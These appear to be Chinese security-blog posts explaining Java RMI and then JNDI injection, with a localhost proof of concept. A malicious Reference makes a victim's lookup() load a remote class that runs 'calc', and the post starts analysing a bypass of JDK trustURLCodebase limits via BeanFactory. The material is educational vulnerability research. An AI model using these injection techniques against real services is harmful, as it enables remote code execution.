<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个接口不仅要给server用，还要给client用，client中通常是把服务端接口打包成jar包使用。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloService</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="comment">//继承Remote接口以后，该Class成为Server的一个远程对象，供Client访问并提供一定服务</span></span><br><span class="line">    <span class="comment">//Remote只是一个标识接口，不含任何方法，继承该接口的类可以被远程的JAVA虚拟机调用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//因为远程调用会涉及到网络通信，容易出现网络异常，所以需要抛出RemoteException</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;<span class="comment">//事实上，RemoteException也是继承于IOException的</span></span><br><span class="line">    <span class="comment">//修饰符必须为public 否则会报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="定义Service-Implementation-Class"><a href="#定义Service-Implementation-Class" class="headerlink" title="定义Service Implementation Class"></a>定义Service Implementation Class</h2><p>定义好了远程接口后，需要写出具体的方法内容即实现类。该类需要继承<code>UnicastRemoteObject</code>，而这个父类会生成<code>stub</code>和<code>skeleton</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="comment">//用来调用远程接口， 这样客户端访问远程对象的时候，远程对才会把自身的一个拷贝(stub存根)以socket的形式传输给客户端</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//UnicastRemoteObject 将生成stub（远程对象在本地的代理）和skeleton（服务端的一个代理，用来处理stub发来的请求）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImp</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloServiceImp</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line"> <span class="comment">//如果父类的无参构造函数抛出了异常，则子类的无参构造函数不能省略不写，并且必须抛出父类的异常或父类异常的父类</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;这是远程服务器发来的消息&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Registry-Class"><a href="#Registry-Class" class="headerlink" title="Registry Class"></a>Registry Class</h2><p>写好了服务接口，那么我们就需要一个中间代理人 - Registry。</p>
<p>我们需要创建并启动RMIService，并把我们提供的实现类绑定在上面。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> server.HelloService;</span><br><span class="line"><span class="keyword">import</span> server.HelloServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中间代理人</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIRegister</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloServiceImp</span>();<span class="comment">//imp会自动调用父类的构造方法来生成返回stub</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//在本地创建并启动RMIService，被创建的RMIService服务将会在指定的端口上监听请求。</span></span><br><span class="line">            Naming.bind(<span class="string">&quot;rmi://localhost:1099/helloService&quot;</span>, helloService);</span><br><span class="line">            <span class="comment">//执行这个方法后相当于发布了RMI服务，把远程服务的实现类绑定到指定的RMI地址上</span></span><br><span class="line">            System.out.println(<span class="string">&quot;远程对象绑定成功！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发生重复绑定对象异常&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发生URL协议异常&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;创建远程对象异常&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h2><p>直接使用<code>Naming.lookup()</code>可以找到我们想要的<strong>stub</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> server.HelloService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//在远程对象注册表registry中寻找指定name的对象，并返回reference</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取register</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">            <span class="keyword">for</span>(String i : registry.list())&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;注册的服务：&quot;</span>+i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) Naming.lookup(<span class="string">&quot;rmi://localhost:1099/helloService&quot;</span>);<span class="comment">//返回的就是stub</span></span><br><span class="line">            System.out.println(helloService.hello());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Client上的接口"><a href="#Client上的接口" class="headerlink" title="Client上的接口"></a>Client上的接口</h2><p>即使我们在服务端上设计了一套接口<code>HelloService</code>，但是Client是不知道的，所以我们需要在Client端设定一模一样的接口，这样Client才知道哪些方法能够被他们所调用。</p>
<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>先运行<code>RMIRegister</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B/image-20210725220714621.png" alt="image-20210725220714621"></p>
<p>可以看到，RMIService成功绑定。</p>
<p>再运行Client：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B/image-20210725220758857.png" alt="image-20210725220758857"></p>
<p>成功收到远程服务器上的方法返回值。</p>
<h1 id="RMI的安全问题"><a href="#RMI的安全问题" class="headerlink" title="RMI的安全问题"></a>RMI的安全问题</h1><h2 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h2><p>RMI在数据传输过程中，涉及到序列化和反序列化，这就有构造恶意对象的风险。</p>
<h2 id="伪造LocateRegister攻击client"><a href="#伪造LocateRegister攻击client" class="headerlink" title="伪造LocateRegister攻击client"></a>伪造LocateRegister攻击client</h2><p>我们客户端获取<strong>stub</strong>的方式是通过**Naming.lookup()**来查找指定url</p>
<p>例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*Client.java*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) Naming.lookup(<span class="string">&quot;rmi://localhost:1099/helloService&quot;</span>);<span class="comment">//返回的就是stub</span></span><br><span class="line">System.out.println(helloService.hello());</span><br><span class="line"><span class="comment">//此处我们是通过查找RMI服务地址localhost:1099中的helloService对象</span></span><br></pre></td></tr></table></figure>

<p>如果该<strong>lookup()<strong>方法中的</strong>rmi</strong>地址(也就是LocateRegister)是可控的，让Client获取到的service是我们构造的恶意service(攻击者搭建的RMI server和实现的恶意对象)，<strong>我们就能执行恶意helloService中的hello()了</strong></p>
<p>RMI的利用方法远远不止如此，更多相关内容可见<a href="https://leihehehe.github.io/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/">Java反序列化漏洞之利用链分析集合(4)</a></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://y4er.com/post/java-rmi/">Java RMI原理及反序列化学习</a></p>
<p><a href="https://f5.pm/go-61706.html">JAVA安全基础（四）– RMI机制</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">Java安全之RMI反序列化</a></p>
<p><a href="http://devgou.com/article/Java-RMI/">Java-RMI</a></p>
<p><a href="https://blog.csdn.net/zhouxukun123/article/details/78324750">[改善Java代码]不要在构造函数中抛出异常</a></p>
<p><a href="https://www.guildhab.top/2020/03/java-rmi-ldap-%25E6%25B5%2581%25E7%25A8%258B%25E5%2588%2586%25E6%259E%2590">Java 反序列化漏洞(1) – Java RMI 原理/流程</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之JNDI注入详解(9)</title>
    <url>/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3-9/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们在爆出的Java相关的漏洞复现中经常遇到JNDI注入，比如在最近的<strong>log4j2</strong>命令执行漏洞中就涉及到JNDI注入。</p>
<p>此篇文章将详细讲解JNDI注入原理、与RMI和LDAP等服务配合注入的例子。</p>
<span id="more"></span>

<h1 id="JNDI是什么"><a href="#JNDI是什么" class="headerlink" title="JNDI是什么"></a>JNDI是什么</h1><blockquote>
<p>JNDI是 Java 命名与目录接口（Java Naming and Directory Interface）</p>
</blockquote>
<p>之前我们有提到过<strong>RMI</strong>的概念，但在实际安全测试中，RMI远程动态类加载的条件十分苛刻，这一点在<a href="https://leihehehe.github.io/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/">Java反序列化漏洞之利用链分析集合(4)</a>中的<strong>codebase命令执行</strong>有提到。</p>
<blockquote>
<p>The JNDI architecture consists of an API and a service provider interface (SPI). Java applications use the JNDI API to access a variety of naming and directory services.</p>
</blockquote>
<p>JNDI实际上就是提供一个API接口，让客户端能够用一个name来访问到不同的服务。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/t01316219a49d6d613b.png" alt="img"></p>
<p>通过上图可以发现，JNDI architecture由四个部分组成, 而之前提到的<strong>RMI动态加载类</strong>便是直接发生在<strong>SPI接口</strong>上</p>
<h1 id="JNDI-Reference-RMI"><a href="#JNDI-Reference-RMI" class="headerlink" title="JNDI Reference + RMI"></a>JNDI Reference + RMI</h1><h2 id="由来"><a href="#由来" class="headerlink" title="由来"></a>由来</h2><blockquote>
<p>In order to bind Java objects in a Naming or Directory service, it is possible to use Java serialization to get the byte array representation of an object at a given state. However, it is not always possible to bind the serialized state of an object because it might be too large or it might be inadequate. </p>
<p>For such needs, JNDI defined Naming References (or just References from now on) so that objects could be stored in the Naming or Directory service indirectly by binding a reference that could be decoded by the Naming Manager and resolved to the original object.</p>
</blockquote>
<p>我们希望通过java序列化的方式来得到远程的object，但有时候可能不会成功。因此JNDI提出了<strong>Naming references</strong> - 即返回一个reference，该reference会在<strong>Naming Manager</strong>上被解析（而非SPI接口上）， 最后再由JNDI的请求端去加载指定地址上的object。</p>
<p>关键点在于，当我们使用<strong>Naming references</strong>时，动态加载的过程将不再发生在<strong>SPI</strong>上，因此我们之前提到的RMI的codebase动态加载的限制不复存在，但我们也有了在<strong>Naming Manager上的新的限制：</strong>com.sun.jndi.rmi.object.trustURLCodebase需要设为<strong>true</strong>，否则将无法客户端加载codebase上的远程类(默认为false)</p>
<blockquote>
<p><strong>JDK 6u141、7u131、8u121之后：</strong>增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p>
</blockquote>
<h2 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h2><p>此处我们将伪造一个<strong>LocateRegistry</strong>，返回恶意的Reference object</p>
<p><strong>JNDIServer.java</strong>(攻击方)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException, NamingException &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>,<span class="string">&quot;EvilObject&quot;</span>,<span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);<span class="comment">//创建恶意reference,恶意类的地址在127.0.0.1:8080 -&gt;也就是codebase</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);<span class="comment">//</span></span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>,wrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;远程服务启动成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此处Reference类并不继承UnicastRemoteObject，所以我们需要用ReferenceWrapper来对其进行包装 - ReferenceWrapper是继承UnicastRemoteObject的且可被序列化。</p>
<p>随后将恶意reference绑定在RMI LocateRegistry上即可。</p>
<p><strong>TEST.java</strong>(被攻击方)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//新建InitialContext</span></span><br><span class="line">            context.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>);<span class="comment">//访问RMI服务，请求返回EvilObject</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>EvilObject.java(恶意类)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObject</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，我们在Intellij中build project,我们需要模拟的是攻击方JNDIServer.class与EvilObject.class(恶意类)均不和TEST.class放在一起，否则Test.class会在本地找到EvilObject.class,从而不会下载并加载codebase指向的恶意class</p>
<p>在生成的<strong>EvilObject.class</strong>下使用python启动web服务</p>
<p><code>python -m http.server 8080</code></p>
<p>随后运行<strong>JNDIServer</strong>和<strong>TEST</strong>，计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213150021023.png" alt="image-20211213150021023"></p>
<h2 id="lookup流程分析"><a href="#lookup流程分析" class="headerlink" title="lookup流程分析"></a>lookup流程分析</h2><p>限制可能很多人会有困惑，为什么一个**context.lookup()**就能触发反序列化漏洞呢？</p>
<p>我们对Test类调试一下：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213150159372.png" alt="image-20211213150159372"></p>
<p>F7单步步入，</p>
<p>看一下堆栈<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213150616099.png" alt="image-20211213150616099"></p>
<p>前面流程太多就不分析了，我们注意到在<strong>RegistryContext.lookup()<strong>中，我们从registery得到了Reference类型的<code>obj</code>，随后返回了</strong>decodeObject()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213150948072.png" alt="image-20211213150948072"></p>
<p>我们再在decodeObject处下个断点，跟进去看看是什么</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213151220258.png" alt="image-20211213151220258"></p>
<p>继续跟到getObjectInstance</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213151347130.png" alt="image-20211213151347130"></p>
<p>继续跟进<code>getObjectFactoryFromReference()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213151656449.png" alt="image-20211213151656449"></p>
<p>最后计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213151546025.png" alt="image-20211213151546025"></p>
<h1 id="JNDI-RMI绕过高版本JDK限制"><a href="#JNDI-RMI绕过高版本JDK限制" class="headerlink" title="JNDI+RMI绕过高版本JDK限制"></a>JNDI+RMI绕过高版本JDK限制</h1><h2 id="由来-1"><a href="#由来-1" class="headerlink" title="由来"></a>由来</h2><p><strong>JDK 6u141、7u131、8u121之后：</strong>增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。</p>
<p>那有没有什么办法能够绕过这样的限制呢？</p>
<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><p>我将JAVA版本切换到<strong>1.8.0_181</strong>，删除掉之前设置的<code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);</code></p>
<p><strong>被攻击方 TEST.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            context.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行后提示：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215154956341.png" alt="image-20211215154956341"></p>
<p>我们下断点来跟一下具体是怎么检测的。</p>
<p>一直跟到<strong>decodeObject()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215155320815.png" alt="image-20211215155320815"></p>
<p>此处会check传过来的instance里是否有FactoryClassLocation，同时checktrustURLCodebase是否为flase，如果满足以上条件，则抛出异常。我们已知<strong>trustURLCodebase</strong>是无法改变的，因为我们之前在客户端并未设置<code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);</code>，所以该variable一定是<strong>false</strong>。但是我们可以让传过来的reference不带FactoryClassLocation,这样就不会抛出异常了。</p>
<p>继续往下看，我们发现，当我们绕过了这个if statement以后，会进入<strong>NamingManager.getObjectInstance()</strong></p>
<p>我们先修改一下server端，在继续来调试一下看看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AlreadyBoundException, NamingException, ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>));<span class="comment">//去掉了FactoryLocation，先随便写</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>,wrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;远程服务启动成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215161517089.png" alt="image-20211215161517089"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215161924194.png" alt="image-20211215161924194"></p>
<p>我们再看回Server的代码，我们发现构造reference的时候可以传入factory，但是后面还需要factoryLocation,我们直接传null就好了</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215162132105.png" alt="image-20211215162132105"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AlreadyBoundException, NamingException, ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObject&quot;</span>,<span class="string">&quot;EvilObject&quot;</span>,<span class="literal">null</span>);<span class="comment">//这里的className和factory都是暂时的，只是为了搞清楚流程</span></span><br><span class="line">        <span class="comment">//Reference reference = new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;,&quot;http://127.0.0.1:8080/&quot;);</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/EvilObject&quot;</span>,wrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;远程服务启动成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次调试客户端：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215162526558.png" alt="image-20211215162526558"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215162856640.png" alt="image-20211215162856640"></p>
<p>在最后一行，根据加载的class返回了一个<strong>ObjectFactory</strong>类型的instance。 因此，我们需要寻找一个客户端本地存在的实现ObjectFactory类的class来利用，同时构造函数得是无参构造函数。</p>
<p>光是构造了一个instance并不够，因为客户端上不可能有一个我们已经放上去的恶意类，要不然也太简单了。</p>
<p>继续返回<strong>NamingManager.getObjectInstance()</strong></p>
<p>我们发现，在获取到factory instance后，还执行了factory的getObjectInstance方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215163846004.png" alt="image-20211215163846004"></p>
<p>那么我们现在确定需要找到满足以下条件的<strong>class</strong>:</p>
<ul>
<li>implements ObjectFactory class</li>
<li>有【无参构造函数】</li>
<li>其**getObjectInstance()**方法能有办法执行RCE命令</li>
</ul>
<p>接下来就是漫漫长路…</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211215165054737.png" alt="image-20211215165054737"></p>
<h2 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h2><p>可能是经验太少了，见得也少，对这种能够执行RCE的类的敏感度还不够高，我自己没能第一眼找出来可以利用的类，这里借鉴网上的文章，得知BeanFactory可以作为这个被我们利用的class。</p>
<p>我们继续分析。</p>
<p>在**BeanFactory.getObjectInstance()**中，我们往下翻，看到了反射，说明该类确实是可能被我们所利用的</p>
